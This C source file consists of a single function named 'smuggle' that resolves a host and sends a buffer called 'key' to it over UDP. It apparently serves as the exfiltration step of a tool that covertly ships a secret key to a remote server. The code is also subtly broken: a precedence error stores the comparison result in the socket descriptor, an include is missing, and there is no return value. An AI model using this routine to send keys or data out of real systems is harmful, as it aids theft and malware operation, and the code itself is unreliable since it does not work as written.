#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int smuggle(char *IP, int PORT, char *key, size_t key_len) {
    int socket_fd;
    if(socket_fd = socket(AF_INET, SOCK_DGRAM, 0) < 0) {
        printf("Create socket failed !\n");
        return -1;
    }

    struct sockaddr_in server_addr;
    struct hostent *he;
    memset(&server_addr, 0, sizeof(struct sockaddr_in));
    he = gethostbyname(IP);
    if (NULL == he) exit(1);
    memcpy(&server_addr.sin_addr, he->h_addr_list[0], he->h_length);
    server_addr.sin_port = htons(PORT);
    server_addr.sin_family = AF_INET;
    sendto(socket_fd, key, key_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    close(socket_fd);
}
